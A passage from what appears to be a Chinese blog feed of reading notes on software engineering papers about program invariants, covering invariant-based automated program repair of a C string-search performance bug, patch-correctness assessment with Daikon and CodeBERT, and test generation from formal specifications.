id="3.2-%E4%BD%BF%E7%94%A8%E5%9F%BA%E4%BA%8E%E4%B8%8D%E5%8F%98%E9%87%8F%E7%9A%84apr%E4%BF%AE%E5%A4%8D%E7%8E%B0%E5%AE%9E%E4%B8%96%E7%95%8C%E7%9A%84%E6%80%A7%E8%83%BDbug" tabindex="-1">3.2 使用基于不变量的APR修复现实世界的性能bug</h4><ul><li>本节，我们将展示基于不变量的APR可以用于解决现实世界的性能bug。处于空间的原因，我们只考虑一个有趣的性能bug的实例，如下代码。这个bug是基于真实事件Apache的一个真实缺陷，也被其它研究人员研究过</li></ul><pre><code class="language-C">int found = -1;while ( found &lt; 0 ) &#123;// Check if string source [] contains target []  char first = target [0];  int max = sourceLen - targetLen ;  for (int i = 0; i &lt;= max; i++) &#123;    // Look for first character .    if ( source [i] != first) &#123;      while (++i &lt;= max &amp;&amp; source[i] != first );    &#125;   // Found first character    if (i &lt;= max) &#123;      int j = i + 1;      int end = j + targetLen - 1;      for (int k=1; j&lt;end &amp;&amp; source [j]== target[k]; j++, k ++);        if (j == end) &#123;        /* Found whole string target . */          found = i;          break;        &#125;      &#125;  &#125;  // append another character ; try again  source [ sourceLen ++] = getchar ();&#125;</code></pre><h5 id="%E5%AF%B9%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90" tabindex="-1">对程序分析</h5><ul><li>该程序旨在确定给定的（目标）字符串是否包含在另一个（源）字符串中。如果在源字符串中找到了目标字符串，程序设置变量<code>found</code>设置为目标字符串的第一个字符的索引。</li><li>但是，该程序存在一个很大的性能缺陷：<ul><li>当目标字符串位于源字符串的开头时，运行速度很快；</li><li>当字符串接近源字符串末尾时，运行速度缓慢，这是因为有大量冗余计算的增加，错误在于for循环控制的循环变量i的初始化语句在第6行应该放在主while循环外，就在变量<code>found</code>初始化之后</li></ul></li></ul><h4 id="3.3-%E7%BB%93%E6%9E%9C%E5%92%8C%E5%88%86%E6%9E%90" tabindex="-1">3.3 结果和分析</h4><ul><li>为了处理3.2中的性能bug，我们选择了两种APR工具，这两种工具都是修复C代码的通用修复工具，可以用于修复一系列程序错误，包括循环程序错误<ul><li>基于搜索的GenProg[7]</li><li>基于语义的FAnglix[16]</li></ul></li><li>GenProg成功生成了一个合理的补丁，但FAnglix没有。<ul><li>为了避免原始程序中的重复计算，GenProg将变量i的初始化语句移动到了第6行for循环之外，即修补版本的程序以变量i的初始化语句开始，此时生成的补丁同构了测试用例，因为i不再每次循环接收新字符时被设置为0</li></ul></li><li>为了检查GenProg生成的合理补丁的有效性，我们使用了工具Daikon，比较了原始程序和合理补丁版本的功能和效率断言。 Daikon生成了与功能变量相关的相同不变量集合（即，原始版本和修补版本都有与程序变量相关的相同不变量），这表明补丁保持了原始程序的功能行为</li></ul><h5 id="%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90" tabindex="-1">代码分析</h5><ul><li>代码中包含了4个的循环<ul><li>第2行的while循环</li><li>第6行的for循环</li><li>第9行的while循环</li><li>第15行的for循环</li></ul></li><li>为了评估原始程序和修补程序的效率，需要计算迭代次数的上界，因为补丁不会通过添加或删除操作修改任何循环的逻辑，即在两个程序中，四个循环的每次迭代都涉及相同数量的操作，因此，我为每个循环添加四个迭代计数器(cnt2,cnt6,cnt9,cnt15)来模拟每个循环的效率。 在分析缺陷和修补版本的效率断言中，我们得出以下观察结果<ul><li>对于有缺陷和修补版本中的cnt2，cnt15生成的不变量时相同的，这表明补丁不会影响第2，15行循环的迭代次数</li><li>cnt9只在缺陷版本中递增，并且cnt9&lt;=500499，修补版本不再使用第9行的while循环是一个重大的改进</li><li>Daikon为有缺陷版本生成了不变量cnt6&lt;=1001，而修补版本生成了不变量cnt6&lt;=501，这表明修补版本的第6行循环的迭代次数比原始代码中少了50%</li></ul></li><li>上述发现，以及原始版本和修补版本的衍生功能断言时相同的事实，增强了我们对GenProg工具生成补丁有效性的信心</li></ul><h3 id="4-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">4 相关工作</h3><h4 id="apr%E4%B8%AD%E8%BF%87%E6%8B%9F%E5%90%88%E9%97%AE%E9%A2%98" tabindex="-1">APR中过拟合问题</h4><ul><li>目前已有多种解决方法来缓解APR中的过度拟合问题<ul><li>例如符号规范推断[8]</li><li>基于机器学习的补丁优先级排序[1]</li><li>基于模糊测试的测试套件增强[5]和合成路径探索[12]</li><li>这些措施依赖于有限的不完整的测试用例，不能保证补丁的普遍正确性。</li></ul></li><li>与基于生成测试输入的方法相比面积与不变量的APR在修改代码时自动生成并精炼需要保持的不变量即需要修复的问题不变量，这使得该方法比现有修复方法更可靠。</li><li>现在通用的APR工具依赖于符号执行或合成执行来发现反例并生成修复补丁[9,12],然而这些修复方法需要手动检查生成的补丁是否正确或与开发者的补丁相同，这可能存在错误。 基于不变量的APR使得可以应用自动化验证技术来缓解过拟合问题，并通过与开发者补丁相比较来正式和系统地检查生成的补丁的准确性</li></ul><h4 id="%E8%A7%A3%E5%86%B3%E6%80%A7%E8%83%BD%E9%94%99%E8%AF%AF" tabindex="-1">解决性能错误</h4><ul><li>目前已经进行了许多尝试，使用动态，静态，混合分析方法来检测和修复程序中的性能错误[13,6,10]。<ul><li>[10]对性能错误进行了实证调查，并提出了一个用于识别它们的效率规则。</li><li>[13]中，使用动态-静态分析技术，开发了几种修复策略来识别和解决性能问题。</li></ul></li><li>然而我们的方法与先前的研究不同之处在于，它是一种更通用和精确的技术，利用程序不变量来解决循环程序的性能问题，并产生可靠的补丁。因为系统不变量，原始程序的效率可以系统的和修补版本进行比较</li></ul><h3 id="5-%E7%BB%93%E8%AE%BA-%E5%92%8C-%E6%9C%AA%E6%9D%A5%E5%B7%A5%E4%BD%9C" tabindex="-1">5 结论 和 未来工作</h3><h4 id="%E7%BB%93%E8%AE%BA" tabindex="-1">结论</h4><ul><li>我们描述了一个基于程序不变量概念的新型自动程序修复(APR)系统。<ul><li>基于不变量的APR有望处理比其它APR方法更广泛的错误，并生成更可靠的补丁，这是由于基于不变量的修复系统依赖于更强的正确性指标，而不是测试套件。</li><li>我们通过开发了一个针对性能缺陷的不变量修复系统来展示APR中利用不变量的实用性。 初步结果现实，基于不变量的APR可以帮助生成高质量的补丁，这些补丁可以确保程序效率提高而不会对其功能产生不利影响。</li></ul></li></ul><h4 id="%E6%9C%AA%E6%9D%A5%E5%B7%A5%E4%BD%9C" tabindex="-1">未来工作</h4><ul><li>为了完善此处开始的基于不变量的APR研究，我们确定了以下未来工作的关键方向<ul><li>首先，我们的主要目的是进行深入的实证分析，以确定基于不变量的APR在处理程序中功能性和非功能性缺陷方面的表现如何，这还涉及评估当前可访问的不变量推断和验证工具</li><li>准确的不变量生成是确保基于不变量的APR生成的补丁有效性的关键，我们推测可达性分析可以帮助解决这个复杂的计算任务，我们的目标是将基于不变量的APR与支持不变量生成和精炼的程序验证工具（如CPAChecker和PathFinder）相结合</li></ul></li></ul><h2 id="%E2%85%B1-invalidator%3A-automated-patch-correctness-assessment-via-semantic-and-syntactic-reasoning" tabindex="-1">Ⅱ Invalidator: Automated Patch Correctness Assessment Via Semantic and Syntactic Reasoning</h2><ul><li>引用：Le-Cong T, Luong D M, Le X B D, et al. Invalidator: Automated patch correctness assessment via semantic and syntactic reasoning[J]. IEEE Transactions on Software Engineering, 2023.</li><li>CCF A TSE</li><li><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=10066209">链接</a></li></ul><h3 id="4.1-%E4%BB%8B%E7%BB%8Da" tabindex="-1">4.1 介绍a</h3><ul><li>本论文介绍名为INVALIDATOR的新技术，它结合了语义和语法推理来自动评估由自动程序修复（APR）技术生成的补丁的正确性。<ul><li>利用程序不变量推理程序的语义属性</li><li>使用预训练语言模型捕捉程序语法，该模型从大量代码语料库中学习语言语义。</li></ul></li><li>与其他自动化补丁正确性评估（APAC）技术类似，INVALIDATOR利用APR修补过的程序与真实正确程序之间的行为差异来确定补丁的正确性。然而<ul><li>例如DIFFTGEN [65]、PATCHSIM [66]或RANDOOP [18]、[46]。这些技术生成新测试以增强当前测试套件，其中每个测试生成一个执行，执行次数与生成测试用例成正比</li><li>INVALIDATOR仅使用当前测试套件，并推断出自然泛化超出测试套件的程序不变量，程序不变量的泛化运行INVALIDATOR高效且在语义上推理程序的正确性，此外，INVALIDATOR融入语法推理来增强其有效性，进一步增强语义推理</li></ul></li></ul><h3 id="4.2-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B" tabindex="-1">4.2 工作流程</h3><ul><li><ol><li><strong>基于语义的分类器</strong>：</li></ol><ul><li>由两个高级直观概念构成<ul><li>a. 程序不变量在错误版本和正确版本都保持不变，可以作为程序的正确规范</li><li>b. 只在错误版本存在但在正确版本不存在的程序不变量可能表示程序的错误规范</li></ul></li><li>如果自动生成的不定违反了正确的规范或保留了错误的规范，INVALIDATOR会判断过拟合</li><li>INVALIDATOR首先使用DAIKON根据原始测试套件自动推断每个程序的可能不变式。然后，INVALIDATOR构造正确和错误的规范集合，这些规范作为被测程序的近似规范。根据推断出的规范，如果从机器修补的程序中推断出的不变式违反了正确的规范或保留了错误的规范，INVALIDATOR就会判断补丁过拟合。</li></ul></li><li><ol start="2"><li><strong>基于语法的分类器</strong></li></ol><ul><li>在基于不变式的规范推断无法确定过拟合补丁的情况下，INVALIDATOR进一步通过机器生成的补丁与其错误版本和正确版本之间的语言语义差异来识别过拟合补丁。</li><li>具体使用使用预训练的语言模型，即CODEBERT，从每个程序的源代码中提取源语法特征。然后，INVALIDATOR通过一系列比较函数（例如，减法或相似度）来衡量差异。最后，INVALIDATOR使用从标记数据训练的模型来估计基于语法接近度的机器生成补丁是否过拟合的可能性。</li></ul></li></ul><h3 id="4.3-%E4%B8%BB%E8%A6%81%E5%86%85%E5%AE%B9" tabindex="-1">4.3 主要内容</h3><ul><li><p>在本文中，我们使用Daikon[7]——一个流行的用于挖掘可能不变式的工具，作为我们的动态不变式推断技术。Daikon观察程序的执行轨迹，并将它们与一组模板进行匹配，以推断出在所有或大多数执行中成立的可能不变式。Daikon可以从多达311个模板的大型集合中（参见Daikon手册文档1的细节），检测出广泛概括超出用于产生执行轨迹的测试套件的各种不变式[49]。</p></li><li><p>APR技术的作者通常通过以下两种方式评估补丁的正确性：</p><ul><li>(1) 使用与修复时所用测试套件不同的独立测试套件来测试生成补丁的泛化能力；</li><li>(2) 通过与真实情况进行比较的手动检查来评估APR生成的补丁。</li></ul></li><li><p>Le等人表明，通过独立测试套件进行的自动验证不如手动验证有效，但使用手动验证存在人为偏见的潜在风险。此外，手动验证需要重复且昂贵的任务，而自动验证可以弥补这一点。</p></li></ul><h2 id tabindex="-1"></h2><p>Mesbah A, Van Deursen A, Roest D. Invariant-based automatic testing of modern web applications[J]. IEEE Transactions on Software Engineering, 2011, 38(1): 35-53.</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareRepair </tag>
            
            <tag> Invariant </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不变量推断论文</title>
      <link href="/2024/03/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E4%B8%8D%E5%8F%98%E9%87%8F%E6%8E%A8%E6%96%AD%E8%AE%BA%E6%96%87/"/>
      <url>/2024/03/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E4%B8%8D%E5%8F%98%E9%87%8F%E6%8E%A8%E6%96%AD%E8%AE%BA%E6%96%87/</url>
      
        <content type="html"><![CDATA[<h2 id="0-%E5%9F%BA%E4%BA%8E%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E7%9A%84%E8%BD%AF%E4%BB%B6%E4%B8%8D%E5%8F%98%E9%87%8F%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF-(%E5%8A%A8%E6%80%81%E4%B8%8D%E5%8F%98%E9%87%8F%E7%BB%BC%E8%BF%B0)" tabindex="-1">0 基于动态分析的软件不变量综合技术 (动态不变量综述)</h2><ul><li>引用：Wang B, Lu SR, Jiang JJ, Xiong YF. Survey of Dynamic Analysis Based Program Invariant Synthesis Techniques[J]. Journal of Software, 2020, 31(6): 1681-1702(in Chinese). <a href="http://www.jos.org.cn/1000-9825/6014.htm">http://www.jos.org.cn/1000-9825/6014.htm</a></li><li>软件学报</li></ul><h2 id="2-searching-for-invariants-using-genetic-programming-and-mutation-testing" tabindex="-1">2 Searching for invariants using genetic programming and mutation testing</h2><ul><li>引用：Ratcliff S, White D R, Clark J A. Searching for invariants using genetic programming and mutation testing[C]//Proceedings of the 13th annual conference on Genetic and evolutionary computation. 2011: 1907-1914.</li><li>CCF C GECCO</li><li><a href="https://dl.acm.org/doi/epdf/10.1145/2001576.2001832">链接</a></li></ul><h3 id="1.0-%E6%91%98%E8%A6%81" tabindex="-1">1.0 摘要</h3><ul><li>本文贡献<ul><li>进化搜索可以用来找到程序不变量，就像Daikon发现的那样</li><li>进化搜索能够考虑比基于模板的工具更广泛的不变量范围</li><li>通过将突变测试与进化搜索相结合，可以识别出有趣的不变量</li></ul></li></ul><h3 id="1.1-%E4%B8%BB%E8%A6%81%E5%86%85%E5%AE%B9" tabindex="-1">1.1 主要内容</h3><ul><li>现有生成不变量工具的问题：Daikon的方法可以看作一个根据数据驱动暴力构造不变量的方法。尽管目前有许多启发式方法可以来减少不变量的生成数量，并向程序员展示最有用的不变量，但Daikon由于只能产生与模板对应的不变量，所有存在Daikon找不到有用不变量的情况</li><li>突变测试<ul><li>原理：如果使用测试集T来测试程序p，那么假设p是正确的，它应该通过T中的所有测试。然而，如果对程序p进行小的语法更改（即突变）以产生p’，那么除非p和p’在语义上等价，否则p’应该无法通过测试集</li><li>目的：评估测试套件的效力。它通过对源代码进行有意义的修改，即“突变”，然后运行测试套件来检测这些变化是否能够被检测到，从而评估测试用例的质量。</li><li>不变量与突变测试的关系：使用不变量生成来消除语义等家从而提升突变测试的效率[21]；<br><strong>本文使用突变测试来提高不变量生成效率，同时进行排序</strong></li></ul></li></ul><h2 id="3.-automatic-requirement-extraction-from-test-cases" tabindex="-1">3. Automatic Requirement Extraction from Test Cases</h2><ul><li>引用：Ackermann C, Cleaveland R, Huang S, et al. Automatic requirement extraction from test cases[C]， Runtime Verification: First International Conference, RV 2010, St. Julians, Malta, November 1-4, 2010. Proceedings 1. Springer Berlin Heidelberg, 2010: 1-15.</li></ul><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><ul><li>本论文描述了一种从测试中提取功能需求的方法，其中测试采用输入向量（提供给系统）和输出（系统响应输入而产生）的形式。<ul><li>该方法使用数据挖掘技术从测试数据中推断不变式，并利用自动验证技术来确定这些提出的不变式中哪些确实是不变的，因此可以被视为需求。</li><li>来自涉及汽车电子应用的试点研究的实验结果表明，使用完全覆盖软件结构的测试比结构性不可知的黑盒测试能够产生更完整的不变式。</li></ul></li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li><p>本文提出并评估了一种基于数据挖掘的方法，用于自动从可执行软件构件中提取需求。这项工作的动机是使需求文档更加准确和完整。</p></li><li><p>用于遵循读-执行-写行为模型的软件</p><ul><li>首先，使用自动化测试生成器生成按照几种结构覆盖标准覆盖模型的输入序列集合；每个输入向量产生的输出结果也被收集</li><li>然后，将数据挖掘工具应用于测试数据，以推断在整个测试集上保持不变的输入和输出变量之间的关系（不变式）</li><li>在后续的验证步骤中，使用自动化工具检查哪些提出的不变式确实是不变的；通过这一步骤的不变式随后被提议作为需求。</li></ul></li><li><p>本文结构</p><ul><li>第2节提供了关于数据挖掘、不变式推理以及用于进行本研究的工具和验证技术的背景。</li><li>第3节更详细地概述了我们的方法</li><li>第4节和第5节介绍了涉及生产级汽车应用程序的试点研究结果</li><li>第6节讨论了相关工作</li><li>最后一节包含了我们的结论和未来工作的想法。</li></ul></li></ul><h3 id="2-%E8%83%8C%E6%99%AF" tabindex="-1">2 背景</h3><ul><li>本项工作受到了Raz等人[18, 17]的启发，他们使用数据挖掘工具从运行系统的执行轨迹中推断不变式，用于异常检测的目的。我们的动机不同在于，我们的工作旨在从模型驱动开发的汽车系统程序测试数据中重建需求。</li></ul><h4 id="2.1-%E4%BB%8E%E8%BF%90%E8%A1%8C%E4%B8%AD%E6%8E%A8%E6%96%AD%E4%B8%8D%E5%8F%98%E9%87%8F" tabindex="-1">2.1 从运行中推断不变量</h4><h4 id="2.3-%E5%9F%BA%E4%BA%8E%E4%BB%AA%E5%99%A8%E7%9A%84%E9%AA%8C%E8%AF%81" tabindex="-1">2.3 基于仪器的验证</h4><h3 id="3-%E6%8F%90%E5%8F%96%E9%9C%80%E6%B1%82" tabindex="-1">3 提取需求</h3><ul><li>步骤如下，依赖于使用覆盖测试和数据挖掘工具，从模型的模拟执行运行生成的测试数据中提出不变式，以及对这些不变式的随后验证。</li><li><strong>1 测试用例生成</strong>：通过自动化，基于覆盖的测试生成工具，在设计模型上运行生成的输出</li><li><strong>2 不变量推理</strong>：使用关联规则挖掘工具在第1步的测试数据中发现不变式。该工具提出了一组被认为是被检查模型的不变式的关联规则。我们只报告强度值等于1.0的不变式，这是强度分数可以达到的最大值[22]。这等价于意味着任何报告的不变式在观察到的数据中没有反例，即它是对执行推理的证据的真实不变式。</li><li><strong>3 不变式验证</strong>：模型覆盖度量仅仅保证关键元素（块、条件、决策等）在测试套件中至少执行了一次。当然，它们不能强制覆盖所有可能行为的完整覆盖（即路径覆盖）。这就是为什么推断出的不变式不能假设为真正的需求，并且必须进一步验证以便作为需求报告<ul><li>在Raz等人[18,17]这个验证是手动进行的。我们改为通过将每个候选要求转换为监控模型，并使用IBV来确定提出的不变式是否可以被证明无效，来自动化这个验证步骤。</li><li>在执行这个验证时，验证工具将生成一个新的测试套件，该测试套件在其尝试最大化模型覆盖的过程中，将尝试违反监控模型。如果监控模型不满足，那么它所代表的假定不变式并非对所有轨迹都成立，因此被丢弃。如果监控模型满足，那么我们可以说，具有很高信心水平地，已经从设计模型中推断出一个有效的不变式，并且可以视为一个需求。</li></ul></li></ul><h3 id="6-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">6 相关工作</h3><ul><li>Ernst等人提出的Daikon系统[8]在C、C++、Java和Perl编写的程序中动态检测“可能的不变式”。该方法的早期步骤使用代码插装器获取跟踪数据，这些数据被传递到其推理算法中。这些跟踪数据不能保证对检查中的程序有良好的覆盖；Ernst等人指出，可能需要对检查中的程序进行多次运行并结合。Daikon提出的不变式会检查冗余，但对于除了所提供的跟踪数据之外的测试用例，很难验证不变式的正确性</li></ul><h3 id="7-%E7%BB%93%E8%AE%BA" tabindex="-1">7 结论</h3><ul><li>本文提出了一个从可执行软件工件（例如遵循读-计算-写行为模型的控制软件）中重建需求的框架。该方法依赖于对结构覆盖工件的测试数据应用数据挖掘技术，以导出形式为不变式的建议需求，表达输入和输出之间的关系。然后，该方法使用自动化验证步骤来识别假的不变式。该方法在一个用Simulink建模的生产汽车照明控制应用程序上进行了试点；实验数据表明，使用全覆盖测试数据比随机测试数据产生更好的不变式集，并且迭代应用该方法可以进一步改进这些不变式。</li><li>作为未来的工作，我们希望进一步试验该方法，使用其他与汽车相关的Simulink模型。我们还希望研究使用不同的覆盖标准（如决策覆盖、MC/DC等）对不变式集质量的影响。最后，本研究中研究的不变式缺乏时间方面的内容；我们有兴趣追求允许推断包含时间元素的需求（例如“如果a发生，则b必须在x时间单位内发生”）的需求生成策略。</li></ul><h2 id="4-dig" tabindex="-1">4 Dig</h2><ul><li>引用：Nguyen T V, Kapur D, Weimer W, et al. DIG: A dynamic invariant generator for polynomial and array invariants[J]. ACM Transactions on Software Engineering and Methodology (TOSEM), 2014, 23(4): 1-30.</li><li>CCF A TOSEM</li></ul><h2 id="5-feedback-driven-dynamic-invariant-discovery" tabindex="-1">5 Feedback-driven dynamic invariant discovery</h2><ul><li>引用：Zhang L, Yang G, Rungta N, et al. Feedback-driven dynamic invariant discovery[C]，Proceedings of the 2014 International Symposium on Software Testing and Analysis. 2014: 362-372.</li><li>CCF A ISSTA</li><li><a href="https://doi.org/10.1145/2610384.2610389">链接</a></li></ul><h2 id="6-dysy%3A-dynamic-symbolic-execution-for-invariant-inference" tabindex="-1">6 Dysy: Dynamic symbolic execution for invariant inference</h2><ul><li>引用：Csallner C, Tillmann N, Smaragdakis Y. DySy: Dynamic symbolic execution for invariant inference[C]，Proceedings of the 30th international conference on Software engineering. 2008: 281-290.</li><li>CCF A ICSE</li></ul><h2 id tabindex="-1"></h2><p>N. Tillmann, F. Chen, and W. Schulte. Discovering likely<br>method specifications. Formal Meth. Softw. Eng., pages<br>717–736, 2006.</p><h2 id="-1" tabindex="-1"></h2><p>Y. Wei, C. Furia, N. Kazmin, and B. Meyer. Inferring better<br>contracts. In Int’l Conf. Softw. Eng., pages 191–200, 2011.</p><h2 id="(%E7%96%91%E4%BC%BC%E4%B9%9F%E6%98%AF%E7%94%A8%E6%88%B7%E7%A0%94%E7%A9%B6%EF%BC%9F)" tabindex="-1">(疑似也是用户研究？)</h2><p>[26] N. Polikarpova, I. Ciupa, and B. Meyer. A comparative study<br>of programmer-written and automatically inferred contracts.<br>In Int’l Symp. Softw. Test. Analy., pages 93–104, 2009.</p><h2 id="%EF%BC%88%E4%B9%9F%E6%9C%89%E7%94%A8%E6%88%B7%E7%A0%94%E7%A9%B6%EF%BC%89" tabindex="-1">（也有用户研究）</h2><p>J. W. Nimmer and M. D. Ernst. Automatic generation of<br>program specifications. In Int’l Symp. Softw. Test. Analy.,<br>pages 232–242, July 2002.</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Invariant </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不变量代表功能能力相关论文阅读</title>
      <link href="/2024/03/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E4%B8%8D%E5%8F%98%E9%87%8F%E4%BB%A3%E8%A1%A8%E5%8A%9F%E8%83%BD%E8%83%BD%E5%8A%9B%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
      <url>/2024/03/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E4%B8%8D%E5%8F%98%E9%87%8F%E4%BB%A3%E8%A1%A8%E5%8A%9F%E8%83%BD%E8%83%BD%E5%8A%9B%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="%E2%85%B0-automatic-test-case-and-test-oracle-generation-based-on-functional-scenarios-in-formal-specifications-for-conformance-testing" tabindex="-1">Ⅰ Automatic test case and test oracle generation based on functional scenarios in formal specifications for conformance testing</h2><ul><li>TODO:还挺难的，慢慢看吧</li><li>引用：Liu S, Nakajima S. Automatic test case and test oracle generation based on functional scenarios in formal specifications for conformance testing[J]. IEEE Transactions on Software Engineering, 2020, 48(2): 691-712.</li><li>CCF A TSE</li><li><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9108630">链接</a></li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><h4 id="%E5%8A%A8%E6%9C%BA" tabindex="-1">动机</h4><ul><li>因为用户更关注程序的行为而非内部结构，specification-based testing是一种有效的测试方法来检查conformance</li><li>由于一个功能通常有程序中一个或一组程序路径实现，因此理想情况下，conformance testing应该覆盖specification中归能的所有可能的路径,然而，这提出了一种挑战<ul><li>原则上，specification-based testing 仅根据specification生成测试用例，不考虑程序结构，这将导致需要的功能被检查但有的路径没有被测试。</li><li>一种解决方法是进行结构测试，在此过程中故意生成满足路径覆盖的测试用例。目前，有许多从业者希望此类conformance testing可以自动化。正如业界公认的[15]，自动化结构测试很难，尤其在复杂代码中。符号执行在小规模程序中提供了有限的解决方案，但在复杂大规模的程序时遇到了严重的困难[16]。</li><li>另一种解决方法是formalize用户的需求，达到每个功能都使用形式化符号精确定义的水平[17].此时，不仅可以自动生成测试用例[18]，还可以自动推导出用于测试解雇分析的明确定义的测试oracle。</li><li>但一个有趣的尚未解决的问题是，<strong>如何仅仅基于specification自动生成测试用例，以便执行specification中所有功能，又能覆盖相应程序中所有相关的程序路径</strong></li></ul></li></ul><h4 id="%E6%96%B9%E6%B3%95" tabindex="-1">方法</h4><ul><li>本文提出了一种 <strong>functional scenario-based vibration test case generation method（基于功能的情景振动测试用例生成方法</strong>。称为Vibration-Method或简称V-Method，反映在测试用例生成时“振动这一特征”<ul><li>该方法适用于数据类型丰富的信息系统的测试。其基本原则是将formal specification中的转换为等效的functional scenarios，然后基于这些functional scenarios以“振动的方式”生成测试用例</li><li>测试用例生成和“振动”是我们方法的组成部分，决定了方法的有效性</li><li>一个操作的 functional scenario 定义了其输入和输出的具体关系，在formal specification的背景下,功能场景被表达为一个谓词表达式，通过pre-condition和post-condition来形成，并期望定义用户需求specification中（通常为自然语言）中的一个所需功能</li><li>正如2.1中所解释的，使用我们之前的工作[11],[21]中提出的算法自动推导出一个操作的所有功能场景，我们所倡导的策略是，生成的测试用例应覆盖所有的功能场景，同时覆盖程序中所有represntative program paths （REP），REP是通过将循环展开为条件执行语句得到的所有可执行语句的子集</li></ul></li></ul><h4 id="%E8%B4%A1%E7%8C%AE" tabindex="-1">贡献</h4><ul><li><strong>1.</strong>:基于functional scenarios 提出了两个新的测试用例生成标准。<ul><li>a. 一个要求生成足够的测试用例以覆盖specification中的所有功能场景，这与[2,22,23]中基于specification的测试方法不同</li><li>b. 另一个需要测试用例每一个功能场景的更多细节</li><li>这两个标准 可以通过 input和output驱动的生成策略来实现<ul><li>input-driven strategy: 选择输入变量的值（即测试用例），随后从specification中导出输出的期望值</li><li>output-driven strategy: 选择输出输出变量的期望值，随后根据所选的预期结果生成输入变量的相应测试用例。</li></ul></li><li>Matinnejad等人在[24]、[25]中提出了在测试用例生成中考虑输出多样性的想法，但现有工作中缺乏从给定输出值派生测试用例的具体而准确的方法。我们的方法提供一具体和明确的基于形式化规格的方法，改进了这一点。</li></ul></li><li><strong>2.</strong>：描述了一系列自动测试用例生成的算法，部分算法在之前工作提出过[23]，但许多部分是在本工作中新开发的</li><li><strong>3.</strong>：开发了一个名为V-Step的“振动”步骤，用于启发生成测试用例，目的是覆盖所有的REP。</li><li><strong>4.</strong>：基于功能情景提出了一种分析测试结果自动派生oracle的机制。现有的类似方法使用整个前置和后置田间来形成每个测试结果分析的测试oracle，但我们的方法仅适用相关功能场景，只是前置和后置条件的一部分，来进行测试结果分析，更加高效</li></ul><h3 id="2-%E6%B5%8B%E8%AF%95%E7%AD%96%E7%95%A5%E5%92%8C%E6%A0%87%E5%87%86" tabindex="-1">2 测试策略和标准</h3><ul><li>整体策略：从formal specification自动化生成测试用例，以覆盖specification中所有的功能场景，同时尽可能的实现程序覆盖</li></ul><h4 id="2.1-%E5%8A%9F%E8%83%BD%E5%9C%BA%E6%99%AF" tabindex="-1">2.1 功能场景</h4><ul><li>一个specification的操作S定义为 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><msub><mi>S</mi><mrow><mi>i</mi><mi>v</mi></mrow></msub><mo separator="true">,</mo><msub><mi>S</mi><mrow><mi>o</mi><mi>v</mi></mrow></msub><mo stretchy="false">)</mo><mo stretchy="false">[</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo separator="true">,</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>o</mi><mi>s</mi><mi>t</mi></mrow></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">S(S_{iv},S_{ov})[S_{pre},S_{post}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span 